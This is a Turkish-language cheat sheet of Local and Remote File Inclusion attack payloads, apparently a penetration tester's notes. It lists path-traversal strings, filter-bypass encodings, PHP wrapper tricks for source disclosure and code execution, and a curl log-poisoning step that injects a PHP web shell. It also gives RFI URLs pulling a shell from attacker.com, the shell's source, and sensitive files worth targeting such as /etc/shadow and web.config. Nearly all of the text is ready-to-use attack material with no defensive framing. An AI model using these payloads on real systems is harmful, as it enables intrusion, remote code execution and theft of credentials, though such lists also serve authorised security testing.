**LFI / RFI**



LFI (Local File Inclusion): Sunucudaki dosyaların, uygulamanın include() gibi fonksiyonlarına kullanıcı girdisiyle yüklenmesi.

RFI (Remote File Inclusion): Uzak bir sunucudan kod/dosya dahil ettirilmesi (genelde allow\_url\_include açıkken).



**Temel LFI Payload'ları**



**Linux hedefler**

../../../../etc/passwd

....//....//....//etc/passwd

..%2f..%2f..%2fetc%2fpasswd

%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd



**Null byte (eski PHP < 5.3.4)**

../../../etc/passwd%00



**Windows hedefler**

..\\..\\..\\..\\windows\\win.ini

..%5c..%5c..%5cwindows%5cwin.ini



**Filtre Atlatma**



\# Filtreleme "../" stringini siliyorsa

....//....//....//etc/passwd

\# Çift encode

..%252f..%252f..%252fetc%252fpasswd

\# Path truncation (eski sistemler)

../../../../../../../../etc/passwd/.../.../.../.../.../.../.../...



**PHP Wrapper'ları ile Kaynak Kod Okuma**



\# base64 ile dosya içeriği okuma (çoğu zaman en kullanışlısı)php://filter/convert.base64-encode/resource=index.php

\# data wrapper ile RCE (allow\_url\_include açıksa)data://text/plain,<?php system($\_GET\['cmd']); ?>

\# php input ile RCE (POST body kullanır)php://input



**Log Poisoning → RCE**



bash# 1. User-Agent header'a PHP payload enjekte et

curl -A "<?php system($\_GET\['cmd']); ?>" http://target.com/



\# 2. LFI ile log dosyasını include ettir

http://target.com/page.php?file=../../../var/log/apache2/access.log\&cmd=id



**RFI Payload'ları**



http://target.com/page.php?file=http://attacker.com/shell.txt

http://target.com/page.php?file=http://attacker.com/shell.txt%00

http://target.com/page.php?file=\\\\attacker.com\\share\\shell.php   (SMB - Windows)



php<!-- attacker.com/shell.txt içeriği -->

<?php system($\_GET\['cmd']); ?>



**Hedef Edinilecek Hassas Dosyalar**



/etc/passwd

/etc/shadow

/etc/hosts

/proc/self/environ

/var/log/apache2/access.log

/var/www/html/config.php

C:\\Windows\\win.ini

C:\\inetpub\\wwwroot\\web.config



**Test Araçları**



*Burp Suite + ffuf (wordlist ile parametre fuzz)*

*LFI Suite*

*SecLists Fuzzing/LFI payload listeleri*

